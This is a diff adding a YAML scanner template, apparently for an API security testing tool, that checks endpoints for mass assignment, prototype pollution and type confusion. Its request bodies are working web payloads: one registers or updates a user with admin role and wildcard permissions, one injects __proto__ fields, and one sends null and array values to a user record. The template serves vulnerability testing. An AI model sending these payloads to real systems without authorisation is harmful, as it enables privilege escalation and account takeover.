@@ -1,0 +1,99 @@
+id: MASS-ASSIGN-ADV-01
+name: Advanced Mass Assignment & Prototype Pollution
+severity: high
+category: api-security
+metadata:
+  cwe: CWE-915
+  owasp: API6:2023
+  tags: ["mass-assignment", "prototype-pollution", "privilege-escalation"]
+
+requests:
+  # Test 1: Privilege Escalation Fields (Admin / Role)
+  - method: POST
+    path:
+      - "{{BaseURL}}/api/register"
+      - "{{BaseURL}}/api/profile/update"
+    headers:
+      Content-Type: "application/json"
+    body: |
+      {
+        "username": "attacker",
+        "password": "password123",
+        "role": "admin",
+        "is_admin": true,
+        "is_superuser": true,
+        "permissions": ["*"],
+        "membership": "premium"
+      }
+    matchers:
+      - type: word
+        words:
+          - '"role":"admin"'
+          - '"is_admin":true'
+          - '"membership":"premium"'
+        part: body
+
+  # Test 2: Prototype Pollution via __proto__
+  - method: PATCH
+    path:
+      - "{{BaseURL}}/api/settings"
+    headers:
+      Content-Type: "application/json"
+    body: |
+      {
+        "__proto__": {
+          "polluted": "true",
+          "admin": true
+        }
+      }
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "polluted"
+          - "prototype"
+        part: body
+
+  # Test 3: Extract writable fields from OpenAPI (if exposed)
+  - method: GET
+    path:
+      - "{{BaseURL}}/swagger.json"
+      - "{{BaseURL}}/openapi.json"
+      - "{{BaseURL}}/api/v1/docs"
+    extractors:
+      - type: json
+        name: writeable_schemas
+        json:
+          - '.components.schemas.*.properties | keys'
+    matchers:
+      - type: status
+        status:
+          - 200
+    cache_variables:
+      - writeable_schemas
+
+  # Test 4: Null/Type confusion (ORM bypass)
+  - method: PUT
+    path:
+      - "{{BaseURL}}/api/user/1"
+    headers:
+      Content-Type: "application/json"
+    body: |
+      {
+        "id": null,
+        "email": ["test@evil.com", "admin@evil.com"],
+        "password": {}
+      }
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        words:
+          - "SQL"
+          - "MongoError"
+          - "Sequelize"
+          - "Error"
+        part: body
